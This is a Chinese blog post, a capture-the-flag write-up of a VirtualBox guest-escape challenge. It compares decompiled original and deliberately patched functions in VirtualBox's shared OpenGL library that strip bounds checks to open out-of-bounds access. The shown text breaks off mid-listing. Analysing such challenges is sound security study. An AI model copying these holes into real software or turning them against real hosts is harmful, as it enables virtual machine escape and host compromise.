<!doctype html>



  



    
  

<html class="theme-next logos use-motion" lang="zh-hk">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.useso.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hexo, NexT">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta name="description" content="来自强网杯线下赛的一题VbEscape(VE)，真的想不到事隔一年多再为这个系列续上一篇。在强网杯的RealWorld题目遇到之前调过的漏洞，心里却是没底。为了做这道题目，眼睁睁看着三大桌面虚拟化软件在我的ThinkPad上大打出手。当然不是因为主力的Hyper-v虚拟机和主办方提供的vmware虚拟机镜像会打架，临时需要把windows系统升级到新的2004版本才能跑；也不是因为用现场龟速外网花">
<meta property="og:type" content="article">
<meta property="og:title" content="VirtualBox Exploitation #3">
<meta property="og:url" content="http://matshao.com/2020/09/22/VirtualBox-Exploitation-3/index.html">
<meta property="og:site_name" content="Mid Station">
<meta property="og:description" content="来自强网杯线下赛的一题VbEscape(VE)，真的想不到事隔一年多再为这个系列续上一篇。在强网杯的RealWorld题目遇到之前调过的漏洞，心里却是没底。为了做这道题目，眼睁睁看着三大桌面虚拟化软件在我的ThinkPad上大打出手。当然不是因为主力的Hyper-v虚拟机和主办方提供的vmware虚拟机镜像会打架，临时需要把windows系统升级到新的2004版本才能跑；也不是因为用现场龟速外网花">
<meta property="og:locale" content="zh-hk">
<meta property="og:image" content="https://i.loli.net/2020/09/22/CSl7E8DivryMmdA.png">
<meta property="og:updated_time" content="2020-09-22T13:13:51.451Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="VirtualBox Exploitation #3">
<meta name="twitter:description" content="来自强网杯线下赛的一题VbEscape(VE)，真的想不到事隔一年多再为这个系列续上一篇。在强网杯的RealWorld题目遇到之前调过的漏洞，心里却是没底。为了做这道题目，眼睁睁看着三大桌面虚拟化软件在我的ThinkPad上大打出手。当然不是因为主力的Hyper-v虚拟机和主办方提供的vmware虚拟机镜像会打架，临时需要把windows系统升级到新的2004版本才能跑；也不是因为用现场龟速外网花">
<meta name="twitter:image" content="https://i.loli.net/2020/09/22/CSl7E8DivryMmdA.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Logos',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://matshao.com/2020/09/22/VirtualBox-Exploitation-3/">





  <title> VirtualBox Exploitation #3 | Mid Station </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">

  





<script>
  	var _mtac = {};
  	(function() {
  		var mta = document.createElement("script");
  		mta.src = "http://pingjs.qq.com/h5/stats.js?v2.0.4";
  		mta.setAttribute("name", "MTAH5");
  		mta.setAttribute("sid", "500688563");
  		var s = document.getElementsByTagName("script")[0];
  		s.parentNode.insertBefore(mta, s);
  	})();
</script>





  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="header-logos"> 
      <div class="site-meta ">
  
    <div class="site-meta-headline">
      <a href="/">
        <img class="custom-logo-image" src="/images/logo_light.png" alt="Mid Station">
      </a>
    </div>
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Mid Station</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首頁
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            歸檔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            關於
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 
            
      </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://matshao.com/2020/09/22/VirtualBox-Exploitation-3/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Matthew Shao">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Mid Station">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                VirtualBox Exploitation #3
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-22T17:00:00+08:00">
                2020-09-22
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分類於</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hack/" itemprop="url" rel="index">
                    <span itemprop="name">Hack</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>来自强网杯线下赛的一题VbEscape(VE)，真的想不到事隔一年多再为这个系列续上一篇。在强网杯的RealWorld题目遇到之前调过的漏洞，心里却是没底。为了做这道题目，眼睁睁看着三大桌面虚拟化软件在我的ThinkPad上大打出手。当然不是因为主力的Hyper-v虚拟机和主办方提供的vmware虚拟机镜像会打架，临时需要把windows系统升级到新的2004版本才能跑；也不是因为用现场龟速外网花了半天升级完成后发现Hyper-v还是会跟vmware嵌套虚拟化打架，而vmware里面的64位virtualbox一定要嵌套虚拟化才能运行；说到底就是因为太菜了，之前调试复现的时候都在debug版本上面，只是跟着exp照虎画猫过了一遍，也没有彻底弄懂。学艺不精因为偷懒欠下的债，始终都是要还的。<br><a id="more"></a></p>
<h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><p>题目环境链接：<a href="https://share.weiyun.com/FX5WwUT0" target="_blank" rel="noopener">https://share.weiyun.com/FX5WwUT0</a> 密码a2uamv</p>
<p>附件提供一组ovf格式的vmware虚拟机，一个<code>VBoxSharedCrOpenGL_patch.so</code> 文件，以及virtualbox 6.0.14版本的deb包。在漏洞挖掘方面几乎没有设置难度，只要把deb解压，然后通过和path过后的库文件对比一下就能发现问题，这里使用了diaphora工具，比对发现patch只集中在两个函数，分别是<code>crUnpackExtendShaderSource</code>, 对应函数地址<code>0xf1230</code>, 以及<code>crUnpackExtendGetUniformLocation</code>, 对应函数地址<code>0xf2c10</code>。其实看到这两个函数就基本确定题目是改编自上一篇blog的C3的题目，现在来看看具体做了哪些修改。</p>
<h3 id="0xf2c10-patched"><a href="#0xf2c10-patched" class="headerlink" title="0xf2c10 - patched"></a>0xf2c10 - patched</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall sub_F2C10(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)</span><br><span class="line">&#123;</span><br><span class="line">  int *v6; // rbx</span><br><span class="line">  _DWORD *v7; // r12</span><br><span class="line">  int v8; // er14</span><br><span class="line">  _QWORD *v9; // r15</span><br><span class="line">  unsigned int v10; // esi</span><br><span class="line">  _QWORD *v11; // rbx</span><br><span class="line">  __int64 v12; // rax</span><br><span class="line">  __int64 v13; // rcx</span><br><span class="line">  __int64 v14; // rdx</span><br><span class="line">  _QWORD *v15; // r14</span><br><span class="line">  _QWORD *v16; // rbx</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">24</span>) &lt;= <span class="number">0xB</span>uLL )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">56</span>) = <span class="number">-41</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(int **)(a1 + <span class="number">16</span>);</span><br><span class="line">    v7 = v6 + <span class="number">3</span>;</span><br><span class="line">    v8 = *v6;</span><br><span class="line">    v9 = *(_QWORD **)(a1 + <span class="number">32</span>);</span><br><span class="line">    v10 = v6[<span class="number">2</span>];</span><br><span class="line">    v11 = (_QWORD *)((char *)v6 + (unsigned int)(*v6 - <span class="number">16</span>));</span><br><span class="line">    <span class="keyword">if</span> ( !v9 )</span><br><span class="line">      crWarning((__int64)<span class="string">"Assertion failed: %s=%d, file %s, line %d"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v11 )</span><br><span class="line">      crWarning((__int64)<span class="string">"Assertion failed: %s=%d, file %s, line %d"</span>);</span><br><span class="line">    *v9 = *v11;</span><br><span class="line">    v12 = (unsigned int)(v8 - <span class="number">8</span>);</span><br><span class="line">    v13 = v12 + <span class="number">8</span>;</span><br><span class="line">    v14 = v12;</span><br><span class="line">    v15 = *(_QWORD **)(a1 + <span class="number">40</span>);</span><br><span class="line">    v16 = (_QWORD *)(*(_QWORD *)(a1 + <span class="number">16</span>) + v12);</span><br><span class="line">    <span class="keyword">if</span> ( !v15 )</span><br><span class="line">      crWarning((__int64)<span class="string">"Assertion failed: %s=%d, file %s, line %d"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v16 )</span><br><span class="line">      crWarning((__int64)<span class="string">"Assertion failed: %s=%d, file %s, line %d"</span>);</span><br><span class="line">    *v15 = *v16;</span><br><span class="line">    (*(void (__fastcall **)(_QWORD, _DWORD *, __int64, __int64, __int64, __int64))(*(_QWORD *)(a1 + <span class="number">48</span>) + <span class="number">2048L</span>L))(</span><br><span class="line">      v10,</span><br><span class="line">      v7,</span><br><span class="line">      v14,</span><br><span class="line">      v13,</span><br><span class="line">      a5,</span><br><span class="line">      a6);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="0xf2c10-origin"><a href="#0xf2c10-origin" class="headerlink" title="0xf2c10 - origin"></a>0xf2c10 - origin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall sub_F2C10(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v2; // r15</span><br><span class="line">  unsigned int *v3; // rbx</span><br><span class="line">  _DWORD *v4; // r12</span><br><span class="line">  unsigned int v5; // er14</span><br><span class="line">  _BYTE *v6; // rax</span><br><span class="line">  unsigned int v7; // edx</span><br><span class="line">  int v8; // ecx</span><br><span class="line">  int v9; // er8</span><br><span class="line">  int v10; // er9</span><br><span class="line">  signed __int64 v11; // rax</span><br><span class="line">  __int64 v12; // rax</span><br><span class="line">  const char *v13; // rdi</span><br><span class="line">  unsigned int v14; // ecx</span><br><span class="line">  __int64 v15; // rdx</span><br><span class="line">  _QWORD *v16; // r15</span><br><span class="line">  unsigned int v17; // esi</span><br><span class="line">  _QWORD *v18; // rbx</span><br><span class="line">  __int64 v19; // rax</span><br><span class="line">  _QWORD *v20; // r14</span><br><span class="line">  _QWORD *v21; // rbx</span><br><span class="line"></span><br><span class="line">  v2 = *(_QWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xB</span> )</span><br><span class="line">    goto LABEL_19;</span><br><span class="line">  v3 = *(unsigned int **)(a1 + <span class="number">16</span>);</span><br><span class="line">  v4 = v3 + <span class="number">3</span>;</span><br><span class="line">  v5 = *v3;</span><br><span class="line">  v6 = memchr(v3 + <span class="number">3</span>, <span class="number">0</span>, v2 - <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">56</span>) = <span class="number">-41</span>;</span><br><span class="line">LABEL_21:</span><br><span class="line">    crError((unsigned int)<span class="string">"crUnpackExtendGetUniformLocation: packet_length is corrupt"</span>, <span class="number">0</span>, v7, v8, v9, v10);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = v6 - (_BYTE *)v3;</span><br><span class="line">  <span class="keyword">if</span> ( v11 == <span class="number">-2</span> )</span><br><span class="line">    goto LABEL_21;</span><br><span class="line">  v7 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != v11 + <span class="number">17</span> )</span><br><span class="line">    goto LABEL_21;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; v5 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_19:</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">56</span>) = <span class="number">-41</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = v5 - <span class="number">16</span>;</span><br><span class="line">  v13 = <span class="string">"%s: SET_RETURN_PTR(%u) offset out of bounds\n"</span>;</span><br><span class="line">  v14 = v12 + <span class="number">8</span>;</span><br><span class="line">  LODWORD(v15) = v5 - <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; v12 + <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">    crError((_DWORD)v13, (unsigned int)<span class="string">"crUnpackExtendGetUniformLocation"</span>, v15, v14, v9, v10);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = *(_QWORD **)(a1 + <span class="number">32</span>);</span><br><span class="line">  v17 = v3[<span class="number">2</span>];</span><br><span class="line">  v18 = (_QWORD *)((char *)v3 + v12);</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )</span><br><span class="line">    crWarning(</span><br><span class="line">      (unsigned int)<span class="string">"Assertion failed: %s=%d, file %s, line %d"</span>,</span><br><span class="line">      (unsigned int)<span class="string">"dst || 0==bytes"</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      (unsigned int)<span class="string">"/home/vbox/vbox-6.0.14/src/VBox/GuestHost/OpenGL/include/cr_mem.h"</span>,</span><br><span class="line">      <span class="number">23</span>,</span><br><span class="line">      v10);</span><br><span class="line">  <span class="keyword">if</span> ( !v18 )</span><br><span class="line">    crWarning(</span><br><span class="line">      (unsigned int)<span class="string">"Assertion failed: %s=%d, file %s, line %d"</span>,</span><br><span class="line">      (unsigned int)<span class="string">"src || 0==bytes"</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      (unsigned int)<span class="string">"/home/vbox/vbox-6.0.14/src/VBox/GuestHost/OpenGL/include/cr_mem.h"</span>,</span><br><span class="line">      <span class="number">24</span>,</span><br><span class="line">      v10);</span><br><span class="line">  *v16 = *v18;</span><br><span class="line">  v19 = v5 - <span class="number">8</span>;</span><br><span class="line">  v14 = v5;</span><br><span class="line">  v15 = v19;</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned __int64)(v19 + <span class="number">8</span>) &gt; *(_QWORD *)(a1 + <span class="number">24</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="string">"%s: SET_WRITEBACK_PTR(%u) offset out of bounds\n"</span>;</span><br><span class="line">    goto LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  v20 = *(_QWORD **)(a1 + <span class="number">40</span>);</span><br><span class="line">  v21 = (_QWORD *)(*(_QWORD *)(a1 + <span class="number">16</span>) + v19);</span><br><span class="line">  <span class="keyword">if</span> ( !v20 )</span><br><span class="line">    crWarning(</span><br><span class="line">      (unsigned int)<span class="string">"Assertion failed: %s=%d, file %s, line %d"</span>,</span><br><span class="line">      (unsigned int)<span class="string">"dst || 0==bytes"</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      (unsigned int)<span class="string">"/home/vbox/vbox-6.0.14/src/VBox/GuestHost/OpenGL/include/cr_mem.h"</span>,</span><br><span class="line">      <span class="number">23</span>,</span><br><span class="line">      v10);</span><br><span class="line">  <span class="keyword">if</span> ( !v21 )</span><br><span class="line">    crWarning(</span><br><span class="line">      (unsigned int)<span class="string">"Assertion failed: %s=%d, file %s, line %d"</span>,</span><br><span class="line">      (unsigned int)<span class="string">"src || 0==bytes"</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      (unsigned int)<span class="string">"/home/vbox/vbox-6.0.14/src/VBox/GuestHost/OpenGL/include/cr_mem.h"</span>,</span><br><span class="line">      <span class="number">24</span>,</span><br><span class="line">      v10);</span><br><span class="line">  *v20 = *v21;</span><br><span class="line">  (*(void (__fastcall **)(_QWORD, _DWORD *, __int64))(*(_QWORD *)(a1 + <span class="number">48</span>) + <span class="number">2048L</span>L))(v17, v4, v15);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即使是单从字符串的差异也能看出，这个函数去掉了大段的越界检查，因此可以利用该函数来做越界读的操作。</p>
<h3 id="0xf1230-patched"><a href="#0xf1230-patched" class="headerlink" title="0xf1230 - patched"></a>0xf1230 - patched</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall sub_F1230(unpacker_state *a1, __int64 a2, unsigned __int64 pos, __int64 a4, __int64 a5, int a6)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v7; // rcx</span><br><span class="line">  struc_2 *v8; // r12</span><br><span class="line">  const char *v9; // rdi</span><br><span class="line">  int count; // er13</span><br><span class="line">  unsigned int v11; // er8</span><br><span class="line">  unsigned int v12; // esi</span><br><span class="line">  signed int pos_1; // er15</span><br><span class="line">  char *v15; // rsi</span><br><span class="line">  struc_2 *v16; // rdi</span><br><span class="line">  signed int v17; // eax</span><br><span class="line">  unsigned int v18; // er14</span><br><span class="line">  __int64 v19; // rax</span><br><span class="line">  __int64 v20; // r9</span><br><span class="line">  _QWORD *v21; // rdi</span><br><span class="line">  __int64 v22; // r10</span><br><span class="line">  int v23; // edx</span><br><span class="line">  __int64 v24; // r9</span><br><span class="line">  __int64 v25; // rdx</span><br><span class="line">  __int64 v26; // r9</span><br><span class="line">  _BYTE *v27; // rcx</span><br><span class="line">  __int64 v28; // [rsp+<span class="number">18</span>h] [rbp<span class="number">-38</span>h]</span><br><span class="line"></span><br><span class="line">  v7 = a1-&gt;cbunpackdataleft;</span><br><span class="line">  <span class="keyword">if</span> ( v7 &gt; <span class="number">0x13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (struc_2 *)a1-&gt;pbunpackdata;</span><br><span class="line">    v9 = <span class="string">"crUnpackExtendShaderSource: count %u is out of range"</span>;</span><br><span class="line">    count = v8-&gt;count;</span><br><span class="line">    v11 = count - <span class="number">1</span>;</span><br><span class="line">    v12 = count;</span><br><span class="line">    <span class="keyword">if</span> ( (unsigned int)(count - <span class="number">1</span>) &gt; <span class="number">0x3FFFFFD</span> )</span><br><span class="line">      goto LABEL_29;</span><br><span class="line">    pos = <span class="number">4L</span>L * count + <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= pos )</span><br><span class="line">    &#123;</span><br><span class="line">      pos = (unsigned int)(<span class="number">4</span> * count + <span class="number">20</span>);</span><br><span class="line">      v12 = <span class="number">4</span> * count + <span class="number">20</span>;</span><br><span class="line">      pos_1 = v12;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &gt;= pos )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(pos) = v8-&gt;hasNonLocalLen;</span><br><span class="line">        v15 = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">if</span> ( (int)pos &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v15 = (char *)v8 + pos;</span><br><span class="line">          pos_1 = pos + <span class="number">4</span> * count;</span><br><span class="line">        &#125;</span><br><span class="line">        a6 = pos_1;</span><br><span class="line">        <span class="keyword">if</span> ( v7 &gt;= pos_1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = (struc_2 *)&amp;v8-&gt;pLocalLength;</span><br><span class="line">          v17 = pos_1;</span><br><span class="line">          do</span><br><span class="line">          &#123;</span><br><span class="line">            LODWORD(pos) = v16-&gt;field_0;</span><br><span class="line">            if ( (int)pos &lt;= 0 &amp;&amp; (v16-&gt;field_0 &amp; 0x233) != 0x233  // [!!PATCHED!!]</span><br><span class="line">              || (__int64)v7 &lt; v17</span><br><span class="line">              || (v17 += pos, LODWORD(pos) = v17, (__int64)v7 &lt; v17) )</span><br><span class="line">            &#123;</span><br><span class="line">              v12 = v17;</span><br><span class="line">              v9 = <span class="string">"crUnpackExtendShaderSource: pos %d is out of range"</span>;</span><br><span class="line">              goto LABEL_29;</span><br><span class="line">            &#125;</span><br><span class="line">            v16 = (struc_2 *)((char *)v16 + <span class="number">4</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v16 != (struc_2 *)((char *)&amp;v8[<span class="number">1</span>] + <span class="number">4</span> * v11) );</span><br><span class="line">          v18 = v8-&gt;field_8;</span><br><span class="line">          v19 = crAlloc((unsigned int)(<span class="number">8</span> * count));</span><br><span class="line">          <span class="keyword">if</span> ( !v19 )</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          v20 = pos_1;</span><br><span class="line">          v21 = (_QWORD *)v19;</span><br><span class="line">          v22 = <span class="number">0L</span>L;</span><br><span class="line">          while ( a1-&gt;cbunpackdataleft &gt;= v20 )</span><br><span class="line">          &#123;</span><br><span class="line">            *v21 = a1-&gt;pbunpackdata + v20;</span><br><span class="line">            v23 = *(&amp;v8-&gt;pLocalLength + v22);</span><br><span class="line">            pos_1 += v23;</span><br><span class="line">            <span class="keyword">if</span> ( !v15 )</span><br><span class="line">              *(&amp;v8-&gt;pLocalLength + v22) = --v23;</span><br><span 